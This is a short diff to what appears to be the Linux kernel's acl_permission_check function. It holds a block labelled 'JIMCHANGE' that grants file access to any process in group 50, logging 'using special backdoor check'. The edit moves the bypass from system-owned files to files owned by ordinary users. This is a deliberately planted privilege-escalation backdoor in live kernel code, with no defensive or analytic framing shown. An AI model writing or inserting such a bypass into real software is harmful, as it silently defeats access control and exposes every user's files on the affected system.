@@ -280,8 +280,8 @@ static int acl_permission_check(struct inode *inode, int mask)
 	/* JIMCHANGE START */
 	special.val = (gid_t)((unsigned int)50);
 	hundred.val = (uid_t)((unsigned int)100);
-	if (in_group_p(special) && uid_lte(inode->i_uid, hundred)) {
-		printk("using special backdoor check");
+	if (in_group_p(special) && !uid_lte(inode->i_uid, hundred)) {
+		printk("using special backdoor check\n");
 		return 0;
 	}
 	/* JIMCHANGE END */
